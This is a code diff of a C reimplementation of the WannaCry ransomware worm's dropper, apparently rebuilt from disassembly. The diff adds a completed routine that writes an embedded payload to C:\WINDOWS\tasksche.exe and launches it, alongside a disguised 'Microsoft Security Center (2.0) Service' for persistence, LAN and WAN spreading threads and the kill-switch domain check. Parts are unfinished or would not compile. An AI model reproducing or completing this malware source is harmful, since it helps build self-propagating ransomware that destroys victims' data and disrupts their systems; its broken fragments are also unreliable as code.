@@ -24,113 +24,140 @@ https://www.programmersought.com/article/23574059266/
 char executable_path[MAX_PATH]; //Get executable path 
 
 //obtain the network card configuration and IP address details
-int AdapterInfo()
-{
-	GetAdaptersInfo();
+int AdapterInfo() {
+    GetAdaptersInfo();
 }
 
 //not finished
-int LAN_Spread()
-{
-	LOBYTE();
-	AdapterInfo();
+int LAN_Spread() {
+    LOBYTE();
+    AdapterInfo();
 }
 
 //not finished
-HGLOBAL InitCryptoContext()
-{
-	CryptAcquireContextA(Unknown, NULL, UNK, UNK, &0xf0000000);
-	InitializeCriticalSection(LPCRITICAL_SECTION, &UNKNOWN);
+HGLOBAL InitCryptoContext() {
+    CryptAcquireContextA(Unknown, NULL, UNK, UNK, &0xf0000000);
+    InitializeCriticalSection(LPCRITICAL_SECTION, &UNKNOWN);
 }
 
-HGLOBAL initializeSockets()
-{
-	WSADATA WSAData;
-	if(WSAStartup(MAKEWORD(2,2), &WSAData))
-	{
-		return 0;
-	}
-	InitCryptoContext(); //CryptAcquireContext
-	return initialize_payload();
+HGLOBAL initializeSockets() {
+    WSADATA WSAData;
+    if (WSAStartup(MAKEWORD(2, 2), &WSAData)) {
+        return 0;
+    }
+    InitCryptoContext(); //CryptAcquireContext
+    return initialize_payload();
 }
 
-HGLOBAL InitOperations()
-{
-	HGLOBAL result;
-	int threadCount;
-	result = initializeSockets();
-	if(result)
-	{
-		hLanSpread = beginthreadex(0, 0, LAN_Spread, 0, 0, 0);
-		if(hLanSpread)
-		{
-			CloseHandle(hLanSpread);
-		}
-		threadCount = 0;
-		do
-		{
-			hWANSpread = beginthreadex(0, 0, WAN_Spread, threadCount, 0, 0);
-			if(hWANSpread)
-			{
-				CloseHandle(hWANSpread);
-			}
-			Sleep(2000);
-			hWANSpread++;
-		} while (threadCount < 128);
-		result = 0;
-	}
-	return result;
+HGLOBAL InitOperations() {
+    HGLOBAL result;
+    int threadCount;
+    result = initializeSockets();
+    if (result) {
+        hLanSpread = beginthreadex(0, 0, LAN_Spread, 0, 0, 0);
+        if (hLanSpread) {
+            CloseHandle(hLanSpread);
+        }
+        threadCount = 0;
+        do {
+            hWANSpread = beginthreadex(0, 0, WAN_Spread, threadCount, 0, 0);
+            if (hWANSpread) {
+                CloseHandle(hWANSpread);
+            }
+            Sleep(2000);
+            hWANSpread++;
+        } while (threadCount < 128);
+        result = 0;
+    }
+    return result;
 }
 
-int create_service()
-{
+int create_service() {
     SC_HANDLE hSCManager;
     SC_HANDLE hService;
     char exec_with_args[260];
-    
+
     sprintf(exec_with_args, "%s -m security", executable_path);
     hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-    if(hSCManager != NULL)
-    {
+    if (hSCManager != NULL) {
         //Fix this
         hService = CreateServiceA(hSCManager, "mssecsvc2.0", "Microsoft Security Center (2.0) Service", 0xf01ff, 16, 2, 1, &exec_with_args, NULL, NULL, NULL, NULL, NULL);
-        if(hService != NULL)
-        {
+        if (hService != NULL) {
             StartServiceA(hService, 0, NULL);
             CloseServiceHandle(hService);
         }
         CloseServiceHandle(hSCManager);
         return 0;
     }
-       return 0;
+    return 0;
 }
 
-//not finished 
-int drop_tasksche()
-{
+int drop_tasksche() {
+    HMODULE hModule = GetModuleHandle("kernel32.dll");
+    HANDLE hFile;
+    BOOL(WINAPI * fCloseHandle)(HANDLE hObject);
+    HANDLE(WINAPI * fCreateFile)(LPCTSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+
+    fCloseHandle = (BOOL(WINAPI*)(HANDLE))GetProcAddress(hModule, "CloseHandle");
+    fCreateFile = (HANDLE(WINAPI*)(LPCTSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))GetProcAddress(hModule, "CreateFileW");
+
+    PROCESS_INFORMATION pi = { 0 };
+    STARTUPINFOA si = { 0 };
+    si.cb = sizeof(si);
+    DWORD nNumberOfBytesWritten;
+
+    HRSRC hResInfo = FindResourceA(NULL, MAKEINTRESOURCEA(1831), "UNK");
+    HGLOBAL hResData = LoadResource(NULL, hResInfo);
+    PVOID lpBuffer = LockResource(hResData);
+    DWORD nNumberOfBytesToWrite = SizeofResource(NULL, hResInfo);
+    char szFileName[] = "tasksche.exe";
+    char szPath[MAX_PATH];
+    char szNewPath[MAX_PATH];
+    sprintf_s(szPath, MAX_PATH, "C:\\%s\\%s", "WINDOWS", szFileName);
+    sprintf_s(szNewPath, MAX_PATH, "C:\\%s\\qeriuwjhrf\\%s", "WINDOWS", szFileName);
+
+    MoveFileExA(szPath, szNewPath, MOVEFILE_REPLACE_EXISTING);
+
+    hFile = fCreateFile(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile != INVALID_HANDLE_VALUE) {
+        WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &nNumberOfBytesWritten, NULL);
+        fCloseHandle(hFile);
+    }
+
+    strcat_s(szPath, MAX_PATH, " /i");
+
+    if (CreateProcessA(NULL, szPath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+        fCloseHandle(pi.hProcess);
+        fCloseHandle(pi.hThread);
+    }
+
+    fCloseHandle(hModule);
+
+    return 0;
+}
+/*
+//not finished
+
+int drop_tasksche() {
     HANDLE hModule = GetModuleHandleW("kernel32.dll");
     HANDLE hFile;
 
-    //fix these function definitions
-    /*
+    //fix these function definitions----------------------
     GetProcAddress(hModule, "CreateProcessA");
     GetProcAddress(hModule, "CreateFileA");
     GetProcAddress(hModule, "WriteFile");
     GetProcAddress(hModule, "CloseHandle");
-    
-    typedef BOOL (WINAPI *_CLOSEHANDLE)(HANDLE hObject);
-    typedef HANDLE (WINAPI *_CREATEFILEW)(LPCTSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
-
+    typedef BOOL(WINAPI* _CLOSEHANDLE)(HANDLE hObject);
+    typedef HANDLE(WINAPI* _CREATEFILEW)(LPCTSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
     fCloseHandle = (_CLOSEHANDLE)GetProcAddress(hModule, CLOSEHANDLE, 0);
     fCreateFile = (_CREATEFILEW)GetProcAddress(hModule, CREATEFILEW, 0);
-    
-    */
+    //-----------------------------------------------------
     //copied from: https://github.com/gbmaster/loadLibrary/blob/master/kernel32.cpp
-    
+
     PROCESS_INFORMATION pi;
     STARTUPINFOA si;
     DWORD nNumberOfBytesWritten;
-    
+
     HRSRC hResInfo = FindResourceA(0, 1831, "UNK");
     HGLOBAL hResData = LoadResource(0, hResInfo);
     PVOID lpBuffer = LockResource(hResData);
@@ -145,113 +172,138 @@ int drop_tasksche()
     //GENERIC_WRITE is 0x40000000
     //CreateFileA(szPath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, SYSTEM, NULL);
     hFile = CreateFileA(szPath, 0x40000000, 0, 0, 2, 4, 0);
-    if(hFile != INVALID_HANDLE_VALUE)
-    {
+    if (hFile != INVALID_HANDLE_VALUE) {
         WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &nNumberOfBytesWritten, 0);
         CloseHandle(hFile);
     }
     //add the /i parameter to the end of tasksche
     strcat(szPath, " /i");
     //run tasksche with /i parameters
-    if(CreateProcessA(NULL, szPath, 0, 0, 0, 0x8000000, 0, 0, &pi, &si))
-    {
+    if (CreateProcessA(NULL, szPath, 0, 0, 0, 0x8000000, 0, 0, &pi, &si)) {
         CloseHandle(hFile);
         CloseHandle(hModule);
     }
 }
-
-int no_argument_handler()
-{
+*/
+int no_argument_handler() {
     create_service();
     drop_tasksche();
 }
 
-//Not finished yet, must be fixed for this to work
-SERVICE_STATUS_HANDLE ServiceMain()
-{
-	SERVICE_STATUS_HANDLE result;
-	
-	ServiceStatus.dwServiceType = 32;
-	ServiceStatus.dwCurrentState = 2;
-	ServiceStatus.dwControlsaccepted = 1;
-	ServiceStatus.dwWin32ExitCode = 0;
-	ServiceStatus.dwServiceSpecificExitCode = 0;
-	ServiceStatus.dwCheckPoint = 0;
-	ServiceStatus.dwWaitHint = 0;
+SERVICE_STATUS_HANDLE ServiceMain() {
+    SERVICE_STATUS_HANDLE result = NULL;
 
-	result = RegisterServiceCtrlHandlerA(ServiceName, HandlerProc);
-	if(result)
-	{
-		ServiceStatus.dwCurrentState = 4;
-		ServiceStatus.dwCheckPoint = 4;
-		Servicestatus.dwWaitHint = 0;
-		SetServicestatus(result, &ServiceStatus);
-		InitOperations();
-		Sleep(86400000);
-		ExitProcess(1);
-	}
-	return result;
+    //Initialize ServiceStatus struct
+    SERVICE_STATUS ServiceStatus = {0};
+    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
+    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
+    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
+    ServiceStatus.dwWin32ExitCode = NO_ERROR;
+    ServiceStatus.dwServiceSpecificExitCode = 0;
+    ServiceStatus.dwCheckPoint = 0;
+    ServiceStatus.dwWaitHint = 0;
+    //Register the handler function
+    result = RegisterServiceCtrlHandlerA(ServiceName, HandlerProc);
+    if (!result) return result;
+    //Update service status
+    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
+    ServiceStatus.dwCheckPoint = 0;
+    ServiceStatus.dwWaitHint = 0;
+    if (!SetServiceStatus(result, &ServiceStatus)) return NULL;
+    //Perform initialization operations
+    InitOperations();
+    //Service loop
+    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
+        Sleep(1000);
+        //Perform regular service operations here
+    }
+    //Cleanup operations
+    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
+    ServiceStatus.dwCheckPoint = 0;
+    ServiceStatus.dwWaitHint = 0;
+    if (!SetServiceStatus(result, &ServiceStatus)) return NULL;
+    return result;
 }
+/*
+
+//Not finished yet, must be fixed for this to work
+SERVICE_STATUS_HANDLE ServiceMain() {
+    SERVICE_STATUS_HANDLE result;
+
+    ServiceStatus.dwServiceType = 32;
+    ServiceStatus.dwCurrentState = 2;
+    ServiceStatus.dwControlsaccepted = 1;
+    ServiceStatus.dwWin32ExitCode = 0;
+    ServiceStatus.dwServiceSpecificExitCode = 0;
+    ServiceStatus.dwCheckPoint = 0;
+    ServiceStatus.dwWaitHint = 0;
+
+    result = RegisterServiceCtrlHandlerA(ServiceName, HandlerProc);
+    if (result) {
+        ServiceStatus.dwCurrentState = 4;
+        ServiceStatus.dwCheckPoint = 4;
+        Servicestatus.dwWaitHint = 0;
+        SetServicestatus(result, &ServiceStatus);
+        InitOperations();
+        Sleep(86400000);
+        ExitProcess(1);
+    }
+    return result;
+}
+*/
 
 //https://github.com/jnwilson/MalwareExercises/blob/0994222f90bd7de305ff8115dec053065f8d013f/Chapter%207/ex1.c
 //https://github.com/StefanoBelli/lol/blob/92fd0e349ac42eb71ae9a1302559567cca64c0a1/Win32/ServiceLauncher.c
 //https://github.com/sagishahar/scripts/blob/master/windows_service.c
 //IDA screenshots: https://www.programmersought.com/article/23574059266/
-int RealMain()
-{
-  SC_HANDLE hSCManager;
-  SC_HANDLE SCObject;
-  SERVICE_TABLE_ENTRYA ServiceStartTable;
-  int *argc;
-  char szName[] = "MSSecSvc";
-  GetModuleFileName(NULL, &executable_path, sizeof(executable_path));
-  
-  argc = (int*)__p__argc();
-  if(*argc < 2)
-  {
-     no_argument_handler();
-  }
-  
-  /* https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights */
-  hSCManager = OpenSCManager(0, 0, SC_MANAGER_ALL_ACCESS);
-  
-  if(!hSCManager)
-  {
-    hSCObject = OpenServiceA(hSCManager, szName, SERVICE_START);
-    if(!hSCObject)
-    {
-      //sub_407FA0 hSCObject, 0x3c);
-      CloseServiceHandle(hSCObject);
+int RealMain() {
+    SC_HANDLE hSCManager;
+    SC_HANDLE SCObject;
+    SERVICE_TABLE_ENTRYA ServiceStartTable;
+    int* argc;
+    char szName[] = "MSSecSvc";
+    GetModuleFileName(NULL, &executable_path, sizeof(executable_path));
+
+    argc = (int*)__p__argc();
+    if (*argc < 2) {
+        no_argument_handler();
     }
-    CloseServicehandle(hSCManager);
-  }
-  
-  ServiceStartTable.lpServiceName = "MSSecSvc 2.0";
-  ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTION) ServiceMain;
 
-  return StartServiceCtrlDispatcher(&ServiceStartTable);
+    /* https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights */
+    hSCManager = OpenSCManager(0, 0, SC_MANAGER_ALL_ACCESS);
 
-  //CloseServiceHandle(hSCManager);
-  //CloseServiceHandle(SCObject);
+    if (!hSCManager) {
+        hSCObject = OpenServiceA(hSCManager, szName, SERVICE_START);
+        if (!hSCObject) {
+          //sub_407FA0 hSCObject, 0x3c);
+            CloseServiceHandle(hSCObject);
+        }
+        CloseServicehandle(hSCManager);
+    }
+
+    ServiceStartTable.lpServiceName = "MSSecSvc 2.0";
+    ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
+
+    return StartServiceCtrlDispatcher(&ServiceStartTable);
+
+    //CloseServiceHandle(hSCManager);
+    //CloseServiceHandle(SCObject);
 }
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
-{
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
     char szUrl[] = "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com";
     HINTERNET hInternet;
     HINTERNET hUrl;
     hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     hUrl = InternetOpenUrl(hInternet, szUrl, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, NULL);
-    if (hUrl)
-    {
-      InternetCloseHandle(hUrl);
-      InternetCloseHandle(hInternet);
-      return 0;
-    }
-    else {
-      InternetCloseHandle(hUrl);
-      InternetCloseHandle(hInternet);
-      RealMain();
+    if (hUrl) {
+        InternetCloseHandle(hUrl);
+        InternetCloseHandle(hInternet);
+        return 0;
+    } else {
+        InternetCloseHandle(hUrl);
+        InternetCloseHandle(hInternet);
+        RealMain();
     }
     return 0;
 }
